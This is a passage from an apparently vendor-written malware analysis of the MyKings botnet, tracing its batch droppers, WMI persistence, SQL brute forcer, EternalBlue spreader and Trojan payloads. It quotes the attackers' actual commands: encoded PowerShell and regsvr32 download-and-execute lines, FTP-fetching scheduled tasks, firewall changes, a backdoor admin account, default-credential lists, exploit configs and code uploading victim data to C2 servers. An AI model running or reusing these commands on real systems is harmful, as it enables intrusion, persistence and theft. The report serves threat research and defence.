Filter=\"__EventFilter.Name=\\\"fuckyoumm3\\\"\",\n  Consumer=\"CommandLineEventConsumer.Name=\\\"fuckyoumm4\\\"\"\n\n```\nThis is the event code is an encrypted PowerShell command that downloads a text file from the URL\n_hxxp://wmi.1217bye[.]host/2.txt (the URL may change over time)._\n```\n  $wc=New-Object\n  System.Net.WebClient;$wc.DownloadString('hxxp://wmi.1217bye[.]host/2.txt').trim(\n  ) -split '[\\r\\n]+'|%{$n=$_.split('/')[-1];$wc.DownloadFile($_, $n);start $n;}\n\n```\nThe content of this file is supposed to contain a list of next stage URLs, which get downloaded and\nexecuted. An example content of the 2.txt file was the following:\n```\n  hxxp://173.247.239[.]186/ok.exe\n  hxxp://173.247.239[.]186/upsupx.exe\n  hxxp://173.247.239[.]186/u.exe\n\n```\nAdditional three commands in the WMI script download three further components:\n```\n  hxxp://173.208.139[.]170/s.txt \n  hxxp://35.182.171[.]137/s.jpg\n  hxxp://wmi.1217bye[.]host/S.ps1\n\n```\nHere s.txt is a PowerShell script that downloads a kill list file from hxxp://139.5.177[.]19/l.txt. This file\ncontains a list of process names; the script stops every process in that list:\n```\n  lsmose.exe,C:\\Windows\\debug\\lsmose.exe,1\n  lsmos.exe,C:\\Windows\\debug\\lsmos.exe,1\n  lsmo.exe,C:\\Windows\\debug\\lsmo.exe,1\n  csrw.exe,C:\\Program Files (x86)\\Common Files\\csrw.exe,1\n\n```\n\n18\n\n\n-----\n\n```\n  csrw.exe,C:\\Program Files\\Common Files\\csrw.exe,1\n  lsmosee.exe,c:\\windows\\help\\lsmosee.exe,1\n  csrs.exe,c:\\csrs.exe,1\n\n```\nEach entry has the process name, the file path and a flag that indicates whether the process itself has to\nbe stopped.\n\nThis third persistence method is not present in all c3.bat instances.\n\n**System fingerprinting**\n\nAs a final act c3.bat downloads and executes s.txt. This fetches a kill list, and stops the processes\nspecified in it, and additionally downloads and executes a script called up.txt.\n\nThis is an information gathering script that collects system information (including passwords using\n[Powerkatz) and uploads it to the ftp server 192.187.111.66, which was the active collection server at the](https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)\ntime of writing this document. Several other ftp sites were used during the lifetime of this botnet.\n\nThe latest drop site delivers an additional (and rather vulgar abusive) message for the curious eyes:\n\nThe time stamps on the server suggest time zone GMT+7, which covers parts of eastern Russia,\nVietnam, and Indonesia\n\n**Predecessor: c2.bat**\n\n[The name c3.bat hints that there might be earlier version. In fact, there is a Russian blog](https://chklst.ru/discussion/1596/maynery-kriptovalyut-ispolzuyut-eternalblue-doublepulsar) that connects\nthe Adylkuzz botnet with the DoublePulsar exploit. Additionally, the blog mentions a related file, c2.bat,\nthat (although a lot smaller than a typical c3.bat – as expected form a predecessor) does very similar\nthings, including creating the Mysa1 and Mysa2 scheduled tasks (with similar content as c3.bat).\n```\n  ping 127.0.0.1 -n 10\n  net1 user IISUSER$ /del&net1 user IUSR_Servs /del\n  cacls c:\\windows\\twain_32\\csrss.exe /e /d system&cacls\n  c:\\windows\\twain_32\\csrss.exe /e /d everyone&del c:\\windows\\twain_32\\*.*\n  schtasks /create /tn \"Mysa1\" /tr \"rundll32.exe\n  c:\\windows\\debug\\item.dat,ServiceMain aaaa\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"Mysa2\" /tr \"cmd /c echo open ftp.oo000oo.me>p&echo\n  test>>p&echo 1433>>p&echo get s.dat c:\\windows\\debug\\item.dat>>p&echo bye>>p&ftp\n  -s:p\" /ru \"system\" /sc onstart /F\n  netsh ipsec static add policy name=win\n  …\n\n```\nAdditionally, the very characteristic WMI event code was also presented in the blog.\n\nThis earlier batch file version used a slightly different configuration file which contained two sections.\n```\n  [down]\n  hxxp://79.124.78[.]127/close.bat C:\\windows\\debug\\c2.bat 1\n  hxxp://139.5.177[.]10/ok.exe c:\\windows\\temp\\v.exe 1\n  hxxp://185.22.172[.]13/upsupx.exe c:\\windows\\temp\\conhost.exe 1\n  [cmd]\n  net1 start schedule\n  net1 user IISUSER_ACCOUNTXX /del&net1 user IUSR_ADMIN /del&net1 user snt0454\n  /del&taskkill /f /im Logo1_.exe&del c:\\windows\\Logo1_.exe&taskkill /f /im\n\n```\n19\n\n\n-----\n\n```\n  Update64.exe&del c:\\windows\\dell\\Update64.exe\n  taskkill /f /im misiai.exe&del misiai.exe&del c:\\windows\\RichDllt.dll&net1 user\n  asp.net /del&taskkill /f /im winhost.exe&del c:\\windows\\winhost.exe&del\n  c:\\windows\\updat.exe\n  taskkill /f /im netcore.exe&del c:\\windows\\netcore.exe&taskkill /f /im\n  ygwmgo.exe&del c:\\windows\\ygwmgo.exe&net1 user aspnet /del&net1 user LOCAL_USER\n  /del\n  schtasks /create /tn \"Mysa\" /tr \"cmd /c echo open ftp.1226bye.xyz>s&echo\n  test>>s&echo 1433>>s&echo binary>>s&echo get a.exe c:\\windows\\update.exe>>s&echo\n  bye>>s&ftp -s:s&c:\\windows\\update.exe\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"Mysa1\" /tr \"rundll32.exe\n  c:\\windows\\debug\\item.dat,ServiceMain aaaa\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"Mysa2\" /tr \"cmd /c echo open ftp.1226bye.xyz>p&echo\n  test>>p&echo 1433>>p&echo get s.dat c:\\windows\\debug\\item.dat>>p&echo bye>>p&ftp\n  -s:p\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"Mysa3\" /tr \"cmd /c echo open ftp.1226bye.xyz>ps&echo\n  test>>ps&echo 1433>>ps&echo get s.rar c:\\windows\\help\\lsmosee.exe>>ps&echo\n  bye>>ps&ftp -s:ps&c:\\windows\\help\\lsmosee.exe\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"ok\" /tr \"rundll32.exe c:\\windows\\debug\\ok.dat,ServiceMain\n  aaaa\" /ru \"system\" /sc onstart /F\n  reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n  \"start\" /d \"regsvr32 /u /s /i:hxxp://js.1226bye[.]xyz:280/v.sct scrobj.dll\" /f\n  reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n  \"start1\" /d \"msiexec.exe /i hxxp://js.1226bye[.]xyz:280/helloworld.msi /q\" /f\n  echo 123>>1.txt&start C:\\windows\\debug\\c2.bat&start rundll32.exe\n  c:\\windows\\debug\\item.dat,ServiceMain aaaa\n\n```\nThe [down] section has the same structure as the download file list in the newer variants, specifies the\ndownload URLs and the local path to save.\n\nThe [command] is similar but a lot smaller than the corresponding section in c3.bat. But it uses the same\nscheduled task names and ftp update sites. Clearly, c2.bat was the previous version of the main script.\n\n**Pre-predecessor: c.bat**\n\nIt is only logical to ask that if both c2.bat and c3.bat exist, what about c1.bat? At this point we can\nreasonably suspect that the existence of an even earlier version of this script is a possibility.\n\nThis assumption is further supported by the fact that one of the c2.bat instances contains the following\nclean-up code, that removes a certain c.bat:\n```\n  del c:\\windows\\debug\\c.bat\n  del c:\\windows\\debug\\c2.bat\n\n```\n[This hints that the original version of the script must have existed with this name. We found a posting](https://www.bleepingcomputer.com/forums/t/652645/a-massive-virus-attack-including-the-notorious-wannacry-virus/)\n[on a malware analysis message board from June 2017 where a user describes a MyKings attack (file](https://www.bleepingcomputer.com/forums/t/652645/a-massive-virus-attack-including-the-notorious-wannacry-virus/)\nnames and distribution servers match to the identified campaigns) that was creating a file with that\n[name, which was later followed up with a more detailed description.](https://www.peerlyst.com/posts/eternalblue-exploit-actively-used-to-deliver-remote-access-trojans-cyphort-inc-1)\n\nThe attack used server associated with MyKings, also the config file uses the same [down] and\n\n_[command] section as c2.bat._\n\nThis very early c.bat lacked most of the functionality of the later versions, only the firewall rule setting\ncode was there.\n```\n  ping 127.0.0.1 -n 10\n  reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n  \"rundll32\" /f\n  sc config MpsSvc start= auto&net1 start MpsSvc&netsh advfirewall set allprofiles\n\n```\n20\n\n\n-----\n\n```\n  state on\n  netsh advfirewall firewall delete rule name=\"deny tcp 445\"\n  netsh advfirewall firewall delete rule name=\"tcp all\"\n  netsh advfirewall firewall delete rule name=\"deny udp 445\"\n  netsh advfirewall firewall delete rule name=\"tcpall\"\n  netsh advfirewall firewall add rule name=\"tcp all\" dir=in protocol=tcp\n  localport=0-65535 action=allow\n  netsh advfirewall firewall add rule name=\"deny tcp 445\" dir=in protocol=tcp\n  localport=445 action=block\n  netsh advfirewall firewall add rule name=\"deny udp 445\" dir=in protocol=udp\n  localport=445 action=block\n  netsh advfirewall firewall add rule name=\"tcpall\" dir=out protocol=tcp\n  localport=0-65535 action=allow \n  del c:\\windows\\debug\\c.bat\n  exit\n\n```\nThere was a WMIInjector Trojan mentioned in the article that executes the so-characteristic WMI\ncommand.\n\nApparently, the functionality of this Win32 component was later migrated to the scripts used in the\nattacks nowadays.\n\n##### Initial infection vector\n\nNormally this would be the first item in the description of the infection chain. However, our\ninvestigation started in the middle, with the bootkit installer, and the initial infection vector could be\nidentified only after the components were analyzed in detail and revealed some connections.\n\n**SQL server brute forcing**\n\nOur telemetry indicated that in some cases the bootkit installer was created by sqlservr.exe, the genuine\nclean application by Microsoft.\n\n[Multiple articles that cover the MyKings botnet suggest that SQL brute forcing is one of the spreading](https://www.proofpoint.com/us/threat-insight/post/smominru-monero-mining-botnet-making-millions-operators)\n[method](https://www.proofpoint.com/us/threat-insight/post/smominru-monero-mining-botnet-making-millions-operators) used by the threat actors. This was a good enough starting point to search for tools that could\ninject commands into SQL servers.\n\n21\n\n\n-----\n\n**SQL command collection**\n\n[A file found on pastebin came to our aid to fill in the gaps. This file contains SQL command scripts that](https://pastebin.com/BiB8bATG)\nmatch many of the file names, event names and IP addresses used in MyKings attacks. This is very\nstrong indication that this command collection is related to MyKings.\n\nWe suspect that it was not uploaded by the threat actors, rather they were collected from infected\nsystems by a threat response team.\n\nA couple of the scripts were particularly conclusive to establish the connection.\n\n**_dbdotas1.sql_**\n\nThis is the main SQL script, that does component download and execution.\n\nThe activities performed by this script match those of the updater mechanism of the MyKings botnet.\n\n**_dbdotas2.sql_**\n\nThis is a smaller SQL script, that creates a WMI script that also does component download and\nexecution.\n\n\n22\n\n\n-----\n\nThe WMI script is injected with name fuckyoumm2_consumer, which is the event consumer name that\nsome variants of the c3.bat script remove. This event name was also found in some of the MyKings\nrelated WMI commands.\n\n**SQL brute forcer**\n\n[A writeup by DrWeb researchers describes a SQL brute forcer tool related to the Mirai botnet.](https://vms.drweb.com/virus/?_is=1&i=14934685)\n\nThere are many key points that show connections to the MyKings bootkit case, for example the use of\n_dbdotas* script names, also elements in the 123.bat file appear in c3.bat,_\nrunning c:\\windows\\debug\\item.dat with export ServiceMain and parameter aaaa.\n\nWe have found over a dozen different variants of the program, some of them appeared in our telemetry\nreport along with the bootkit, a DNSChanger and a ForShare variant. This connects the brute forcer\napplication to the MyKings operations.\n\nThe tool has the following command line parameters:\n\n-s\n```\n  -run\n  -delete\n  -create\n  -stop\n  -start\n  -cli\n  -srv\n  -see\n  -log\n  -syn\n\n```\nDuring the first execution on an infected system, it is executed with the command lines switches -create\n_-run._\n\nIf -log is specified, then the tool creates a detailed log file during execution:\n\n23\n\n\n-----\n\n```\n  [INFO]08:15:20 [main] WPD V2.0 BULID Dec 28 2018 03:38:41\n  [INFO]08:15:20 [main] System is NOT server\n  [INFO]08:15:20 [main] Work Mode: Remote\n  [MSG]08:15:20 [ServerAgent] HTTP Get [https://ip.seeip.org/geoip]\n  [DEBUG]08:15:20 [ServerAgent] Upload thread started\n  [MSG]08:15:31 [ServerAgent] HTTP RETURN: xx.xx.xx.xx\n  [ERROR]08:15:31 [ServerAgent] reading wpdmd5.txt failed\n\n```\nThe wpdmd5.txt file referred in the log would contain the md5 value of the wpdtest.dat file, which is an\nencrypted data file.\n\nNormally closes the command prompt where it was started from, but with the -see option it leaves open\nand status messages are revealed.\n\nChecks the mutex {3E025CB2-2CD1-4441-98FD-4E6346064404} to make sure it runs as a single instance.\n\nDownloads the following files:\n```\n  45.58.135[.]106/xpxmr.dat\n  45.58.135[.]106/ok/wpd.html\n  66.117.6[.]174/ver.txt\n  66.117.6[.]174/shellver.txt\n  66.117.6[.]174/csrs.exe\n\n```\nThe tool supports several different infection methods, each targeting different applications or services.\nIt may vary between the versions, but the older versions usually contained the following spreading\nmodules:\n```\n  [Cracker:IPC] \n  [Cracker:MSSQL]\n  [Cracker:MySQL]\n  [Cracker:RDP]\n  [Cracker:SSH]\n  [Cracker:Telnet]\n  [Cracker:WMI]\n\n```\nSome of the variant contain source file information. From this we can conclude that the following source\nfiles are typically in the project:\n```\n  CheckUpdate.cpp\n  Cracker_Inline.cpp\n  Cracker_Standalone.cpp\n  cService.cpp\n  CThreadPool.cpp\n  Db_Mysql.cpp\n  Dispatcher.cpp\n  IpFetcher.cpp\n  libtelnet.cpp\n  Logger_Stdout.cpp\n  Scanner_Tcp_Connect.cpp\n\n```\n24\n\n\n-----\n\n```\n  Scanner_Tcp_Raw.cpp\n  ServerAgent.cpp\n  Task_Crack_Ipc.cpp\n  Task_Crack_Mssql.cpp\n  Task_Crack_Mysql.cpp\n  Task_Crack_Rdp.cpp\n  Task_Crack_Ssh.cpp\n  Task_Crack_Telnet.cpp\n  Task_Crack_Wmi.cpp\n  Task_Scan.cpp\n\n```\nThe Task_Crack*.cpp files correspond to the different attack modules.\n\nIt also downloads the file wpdtest.dat, which is the encrypted configuration. It is an XML file that\ncontains the configuration data for the attack modules.\n```\n  <wpd>\n  <param>\n  <retries>3</retries>\n  <telnetip>100.43.155.171</telnetip>\n  </param>\n  <ports>\n  <mssql>0</mssql>\n  <mysql>0</mysql>\n  <wmi>0</wmi>\n  <ssh>0</ssh>\n  <telnet>0</telnet>\n  <ipc>0</ipc>\n  <rdp>0</rdp>\n  <cctv>0</cctv>\n  </ports>\n\n```\nEach module has its own section, that specifies the password list that should be probed. For example,\nthe credential list for the SQL module is the following:\n```\n  <mssql>\n  <item><![CDATA[sa ]]></item>\n  <item><![CDATA[sa sa]]></item>\n  <item><![CDATA[sa 123]]></item>\n  <item><![CDATA[sa 123456]]></item>\n  <item><![CDATA[sa password]]></item>\n  <item><![CDATA[sa 525464]]></item>\n  <item><![CDATA[sa shabixuege!@# ]]></item>\n  <item><![CDATA[vice vice]]></item>\n\n```\nOr in the case of Telnet:\n```\n  <telnet>\n  <item><![CDATA[!!Huawei @HuaweiHgw]]></item>\n  <item><![CDATA[system ping ;sh]]></item>\n  <item><![CDATA[root 1001chin]]></item>\n  <item><![CDATA[root xc3511]]></item>\n  <item><![CDATA[root vizxv]]></item>\n  <item><![CDATA[admin admin]]></item>\n\n```\nAdditionally, for each module the list of commands is specified that will be executed on successful\ncompromise. For example, on a successful RDP attack the following infection via ftp download is\nexecuted:\n```\n  <rdp>\n  <item><![CDATA[cmd.exe /c sc delete sharedaccess&echo open 39.109.18.11>s&echo\n  test>>s&echo 3389>>s&echo binary >>s&echo get c.exe>>s&echo bye>>s&ftp   s:s&start c.exe]]></item>\n\n```\n\n25\n\n\n-----\n\n```\n</rdp>\n\n```\n\nIt creates SQL jobs that match the command scripts from the github sql command collection.\n\nSome of the variants contain embedded Linux ELF binaries, that contains strings like GET\n/mirai/mirai.arm. These binaries are Mirai related downloader components for different processor\narchitectures.\n\nThis could be a leftover form an early template used for the spreader. The embedded ELF binaries use\nthe hardcoded IP address to download the modules from. This address is also used in the Telnet\nspreader module:\n\n\n26\n\n\n-----\n\nWe found these IP addresses used in the Mirai related spreading code:\n```\n  67.229.225.20\n  118.193.85.90\n  180.150.226.155\n  192.154.110.156\n\n```\nIt is not clear whether this address is actively used in MyKings, or just a leftover from development\nstage. We found no other connection in the Windows components. On the other hand, it makes no\nsense to keep changing an unused IP address in the code. It is a possibility that apart from the mining\nrelated MyKings operation on Windows, the threat actors are also engaged in Mirai botnet, using the\nsame spreader for both.\n\nSome older variants download an update from the URL\nhxxp://ww3.sinaimg.cn/mw690/717a8b4dgw1f99ly7blarj20c40e4b2a.jpg. At first it looks like an\nordinary picture of Taylor Swift, but a closer look reveals more.\n\n\n27\n\n\n-----\n\nA closer look at the picture file reveals that beyond the image content it contains an appended executable\n\n- a VMProtect packed version of the SQL brute forcer\n\nThis way the update of the brute forcer tool could be disguised as the download of an innocent image file.\n\nNewer versions of the tool added support for the EternalBlue exploit (MS17010). This functionality is not\nintegrated into the spreader program, rather it uses an external program for that, usually created with the\nname csrs.exe. This extra component is an executable converted from Python scripts; it will be described\nin the next section in more detail.\n\nOn normal execution it starts spreading in threads:\n```\n  [INFO]08:56:16 [main] WPD V2.0 BULID Dec 28 2018 03:38:41\n  [INFO]08:56:16 [main] System is NOT server\n  [INFO]08:56:16 [main] Work Mode: Local\n  [MSG]08:56:16 [ServerAgent] HTTP Get [https://ip.seeip.org/geoip]\n  [DEBUG]08:56:16 [ServerAgent] Upload thread started\n  [MSG]08:56:18 [ServerAgent] HTTP RETURN: xxx.xxx.xxx.xxx\n  [DEBUG]08:56:19 [ServerAgent] download wpdtest.dat success\n  [DEBUG]08:56:19 [ServerAgent] remote md5: 143b134b938e1d89957dcced9a1d3228,local\n  md5: \n  [DEBUG]08:56:19 [ServerAgent] genericRandom entry\n  [INFO]08:56:19 [update] check update ...\n  [INFO]08:56:20 [update] ver is same, keep running.\n  [INFO]08:56:20 [update] check http://66.117.6.174/shellver ...\n  [INFO]08:56:20 [main] Scanner Running in TCP_CONNECT mode.\n  [MSG]08:56:20 [TP:CrackerWMI] Preparing threads[100], please wait ...\n  [DEBUG]08:56:20 [Cracker] HandleMs17010 begin\n  [MSG]08:56:21 [TP:CrackerWMI] 100 threads created\n  [MSG]08:56:21 [TP:Scanner] Preparing threads[300], please wait ...\n\n```\nOne of the lines ([INFO]08:56:20 [main] Scanner Running in TCP_CONNECT mode.) signals that the\nprogram performs a portscan in the local area network, as visible in the RCA logs as well, connecting to a\nseries of neighboring IPs:\n\n**EternalBlue spreader**\n\nThe groups was one of the earliest known adopters of the EternalBlue exploit, originally leaked by the\nShadow Brokers.\n\n28\n\n\n-----\n\nIn fact, we found two very different EternalBlue implementations used in MyKings campaigns.\n\nThe earlier version, found in August 2018, was completely based on the NSA leak files.\n\nIt is a self-extracting ZIP file with a couple of custom components inserted. The comment is turned out\nto be in Chinese, and it is the same as in the c3.bat dropper: “The following comments contain selfextracting script commands”\n\nThe archive contained files from the Shadow Brokers distribution, along with the MyKings additions, the\nmost important of which were:\n\n  - _[ns.exe: custom built version of the open source port scanner, masscan, modified to execute](https://github.com/robertdavidgraham/masscan)_\n\ndownShell.exe and perform the update process\n\n  - _downShell.exe: EternalBlue spreader tool_\n\n  - _ok32.dll: 32-bit version of the WMIInjector Trojan (see the section about c.bat_\n\n  - _ok64.dll: 64-bit version of the WMIInjector Trojan_\n\n  - _1.ini: custom initialization file_\n\nOn opening the archive, nothing is set to be executed: This archive only copies the content into\nc:\\windows, and expects other modules to execute it. We found a DNSChanger version that referred to\nthe components in c:\\windows\\nsa directory, these must have been used together with this SFX file.\n\nThe archive contains the EternalBlue and EternalRomance components form the Shadow Brokers leak,\nand a configuration file that would execute the appropriate files.\n\nOn execution downShell.exe writes out the log:\n\n```\n未能读取 ips.txt，退出\n\n```\n\n(translation: Failed to read ips.txt, exit)\n\nApparently the package is incorrectly compiled, ip.txt should be called ips.txt.\n\nConfigured correctly, the messages would be documenting the execution of the exploit modules and the\ntargeted IP address ranges:\n```\n  start process 2.78.0.0-2.79.0.0\n\n```\n执行 `1 dll\\a.exe --InConfig dll\\a.xml --NetworkTimeout 5 --TargetIp 2.78.0.0-`\n```\n  2.79.0.0 --TargetPort 445 --LogFile ips/2.78.0.0-2.79.0.0.txt\n  start process 52.210.0.0-52.211.0.0\n\n```\n29\n\n\n-----\n\n执行 `1 dll\\a.exe --InConfig dll\\a.xml --NetworkTimeout 5 --TargetIp 52.210.0.0-`\n```\n  52.211.0.0 --TargetPort 445 --LogFile ips/52.210.0.0-52.211.0.0.txt\n  start process 46.52.0.0-46.53.0.0\n\n```\n(执行 means execute in Chinese.)\n\nThe program reads the content of the 1.ini file, that would specify the payload to be delivered by the\nexploits. Although in theory it could support all major exploits from the Shadow Brokers leak\n(EternalBlue, EternalRomance, EternalSynergy and EternalChampion), only the first two are\nimplemented, both execute the 32- or 64-bit version of the WMIInjector Trojan.\n```\n  [ETERNALBLUE]\n  cmd = dll\\b.exe --InConfig dll\\b.xml --NetworkTimeout 5 --TargetIp %ip% -  TargetPort 445 --Target WIN72K8R2 --LogFile ETERNALBLUE/ip/%ip%.txt\n  a=32-bit\n  b=64-bit\n  A = dll\\c.exe --InConfig dll\\c.xml --NetworkTimeout 5 --TargetIp %ip% -  TargetPort 445 --OutConfi logs2.txt --Protocol SMB --Architecture x86 --Function\n  RunDLL --DllPayload ok32.dll --LogFile ETERNALBLUE/32/%ip%.txt\n  B = dll\\c.exe --InConfig dll\\c.xml --NetworkTimeout 5 --TargetIp %ip% -  TargetPort 445 --OutConfi logs3.txt --Protocol SMB --Architecture x64 --Function\n  RunDLL --DllPayload ok64.dll --LogFile ETERNALBLUE/64/%ip%.txt\n  [ETERNALROMANCE]\n  cmd = dll\\b2.exe --InConfig dll\\b2.xml --NetworkTimeout 5 --TargetIp %ip% -  pipename %pipes% --ShellcodeFile 123.bin --target SERVER_2003_SP2 --LogFile\n  ETERNALROMANCE/ip/%ip%.txt\n  all=uccess\n  A = dll\\c.exe --InConfig dll\\c.xml --NetworkTimeout 5 --TargetIp %ip% -  TargetPort 445 --Protocol SMB --Architecture x86 --Function RunDLL --DllPayload\n  ok32.dll --LogFile ETERNALROMANCE/32/%ip%.txt\n  B = dll\\c.exe --InConfig dll\\c.xml --NetworkTimeout 5 --TargetIp %ip% -  TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload\n  ok64.dll --LogFile ETERNALROMANCE/64/%ip%.txt\n\n```\nOnly a month later, in September 2018, the MyKings group switched to a different approach to using\nthe EternalBlue exploit. It is based on a public project on Github. Our telemetry confirmed that the\nEternalBlue exploiter (going with the filename csrs.exe) was created by the SQL brute forcer tool\n(msinfo.exe), and the origin of the entire infection chain was the PowerShell command executed by the\ninjected WMI command.\n\nThe main component of the project, MyExploiter, was modified to cover the needs of MyKings.\n\nThe reported version of the tool is:\n```\n  csrs.exe 1.0\n  Usage: \"usage:csrs.exe [options] target\"\n\n```\nIt supports the following options:\n```\n   --version       show program's version number and exit\n   -h, --help      show this help message and exit\n   -m MODE, --mode=MODE attack mode 0:ms17010 attack one; 1: ms17010 attack by\n              file; 2:blue attack one;3:blue attack Mul;4:check\n              one;5:check Mul)\n   -p PORT, --port=PORT SMB SERVICE PORT\n   -u USER, --user=USER SMB USER\n   -U USERS, --users=USERS\n\n```\n30\n\n\n-----\n\n```\n              user file,SMB USERS\n   --pwd=password    SMB USER PASSWORD\n   --pwds=passwords, --pwds=passwords\n              pwd file,EACH SMB USER PASSWORDS\n   -t THREADS, --threads=THREADS\n              thread num\n   -c COMMOND, --cmd=COMMOND\n              execute commond on target\n   -b BATCH, --batch=BATCH\n              batch file,execute batch file on target\n   -l LISTEN PORT, --listen=LISTEN PORT\n              LISTEN PORT\n\n```\nThis help message is unmodified from the original source, however, there are a few additional\nundocumented features.\n\nThe exploiter is executed by the SQL brute forcer with the following command flags:\n\n```\n-m 6 -t 200 -l 9999\n\n```\n\n_-m specifies that the attack mode is 6, which is a MyKings addition, the original source doesn't have this_\nas it only supported modes 0 through 5, MyKings added an extra mixedAttack mode.\n```\nmodeDic = {'0': attackOne,'1': attackMul,'2': blueAttackOne,'3': blueAttackMul,'4':\ncheckOne,'5': checkMul,'6': mixedAttack,'support': 'NO'}\n\n```\nThe -t option specifies the use of 200 threads for spreading.\n\nThe -l options is another MyKings addition, it specifies to open a socket on port 9999 for listening.\n\nThis mixed mode calls the MS17-010 exploit library to send this custom command to the target\ncomputers:\n\nms17010_cmd = 'cmd /c net1 user admin$ Zxcvbnm,.1234 /ad&net1 localgroup administrators admin$\n```\n/ad&net1 localgroup administradores admin$ /ad&wmic /NAMESPACE:\"\\\\root\\\\subscription\" PATH\n__EventFilter WHERE Name=\"fuckyoumm3\" DELETE&wmic /NAMESPACE:\"\\\\root\\\\subscription\" PATH\nActiveScriptEventConsumer WHERE Name=\"fuckyoumm4\" DELETE&wmic\n/NAMESPACE:\"\\\\root\\\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"fuckyoumm4\"\nDELETE&wmic /NAMESPACE:\"\\\\root\\\\subscription\" PATH __FilterToConsumerBinding WHERE\nFilter=\"__EventFilter.Name=\\'fuckyoumm3\\'\" DELETE&wmic /NAMESPACE:\"\\\\root\\\\subscription\" PATH\n__EventFilter CREATE Name=\"fuckyoumm3\", EventNameSpace=\"root\\\\cimv2\",QueryLanguage=\"WQL\",\nQuery=\"SELECT * FROM __InstanceModificationEvent WITHIN 10800 WHERE TargetInstance ISA\n\\'Win32_PerfFormattedData_PerfOS_System\\'\"&wmic /NAMESPACE:\"\\\\root\\\\subscription\" PATH\nCommandLineEventConsumer CREATE Name=\"fuckyoumm4\", CommandLineTemplate=\"cmd /c powershell.exe\n-nop -enc\n\"JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0A\nDsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA\n3AGIAeQBlAC4AaABvAHMAdAAvADIALgB0AHgAdAAnACkALgB0AHIAaQBtACgAKQAgAC0AcwBwAGwAaQB0ACAAJwBbAFwAc\ngBcAG4AXQArACcAfAAlAHsAJABuAD0AJABfAC4AcwBwAGwAaQB0ACgAJwAvACcAKQBbAC0AMQBdADsAJAB3AGMALgBEAG8\nAdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAXwAsACAAJABuACkAOwBzAHQAYQByAHQAIAAkAG4AOwB9AA==\"&powershell.\nexe IEX (New-Object\nsystem.Net.WebClient).DownloadString(\\'hxxp://wmi.1217bye[.]host/S.ps1\\')&powershell.exe IEX\n(New-Object\nsystem.Net.WebClient).DownloadString(\\'hxxp://173.208.139[.]170/s.txt\\')&powershell.exe IEX\n(New-Object system.Net.WebClient).DownloadString(\\'hxxp://35.182.171[.]137/s.jpg\\')||regsvr32\n/u /s /i:hxxp://wmi.1217bye[.]host:8888/1.txt scrobj.dll&regsvr32 /u /s\n/i:hxxp://173.208.139[.]170/2.txt scrobj.dll&regsvr32 /u /s /i:hxxp://35.182.171[.]137/3.txt\nscrobj.dll\"&wmic /NAMESPACE:\"\\\\root\\\\subscription\" PATH __FilterToConsumerBinding CREATE\nFilter=\"__EventFilter.Name=\"fuckyoumm3\"\",\nConsumer=\"CommandLineEventConsumer.Name=\"fuckyoumm4\"\"&start regsvr32 /s /u /n\n/i:hxxp://173.208.172[.]202:8888\\\\s1.txt scrobj.dll'\n\n```\n31\n\n\n-----\n\nThis creates a new user account admin$ as part of the local admin group, then deletes old WMI event\nconsumers and adds the new event consumer with the PowerShell command line, then downloads and\nexecutes a couple of other components.\n\nThe spreader expects to receive target IP list to be used for spreading on this communication socket. If\nthe -l option is not specified, the tool expects an IP address list file passed as a command line parameter.\n\nThe info about the targeted computers is uploaded to a server:\n```\n  def uploadResult(self, typeStr, content):\n      return requests.post('hxxp://173.208.172[.]202:9999', data=typeStr + ';'\n  + content + '\\n')\n\n```\nThe latest version of the spreader largely simplified the command invoked by the exploit to the\nfollowing:\n```\nms17010_cmd = 'cmd /c net1 user admin$ Zxcvbnm,.1234 /ad&net1 localgroup administrators admin$\n/ad&net1 localgroup administradores admin$ /ad&regsvr32 /s /u /n\n/i:hxxp://78.142.194[.]116:8016/blue.txt scrobj.dll'\n\n```\n_blue.txt is a simple downloader script that downloads the bootkit dropper, a DNSChanger variant and a_\nWinRAR SFX dropper for c3.bat.\n\n##### Payloads\n\nThe botnet delivers several components to the infected systems. The most important ones are covered\nin the following sections.\n\n**PCShare**\n\nThis payload was frequently used during the early activities of the botnet, and occasionally it appears\neven nowadays.\n\nOn infected systems this fragment form c3.bat registers the PCShare Trojan for automatic execution as a\nscheduled task:\n```\n  schtasks /create /tn \"Mysa1\" /tr \"rundll32.exe\n  c:\\windows\\debug\\item.dat,ServiceMain aaaa\" /ru \"system\" /sc onstart /F\n\n```\n[Contains references to source code files that are referred in as PCShare source code](http://en.pudn.com/Download/item/id/3906755.html)\n```\n  .\\MyClientMain.cpp\n  .\\MyClientTran.cpp\n  .\\MyMainFunc.cpp\n  .\\MyMainTrans.cpp\n  .\\PcMain.cpp\n\n```\n[A publication by Antiy researchers](https://www.antiy.com/response/20190822.html) related the MyKings Trojan derived from the PCShare open source\nproject.\n\nThis source code was published in Github and advertised in a Chinese forum.\n\n32\n\n\n-----\n\n**DNSChanger**\n\nThis Trojan is a simple downloader that performs the usual update mechanism driven by the download\nconfig file, but additionally modifies the DNS server settings.\n\nTypical version info of these files is:\n```\nProduct Orgs ps\nOriginal name ps.exe\nInternal name My\nFile version 1.0.0.1\nDescription My \n\n```\nChanges the DNS server list to one of the following, depending on the actual variant:\n```\n  223.5.5.5,8.8.8.8 \n  114.114.114.114,8.8.8.8\n\n```\n223.5.5.5 is part of the AliDNS a DNS recursive resolution system for China launched by the Alibaba\nGroup. 114.114.114.114 is a free DNS also in China. The purpose for the addition of these DNS servers is\nnot clear.\n\nThe Trojan downloads /ok/ups.html 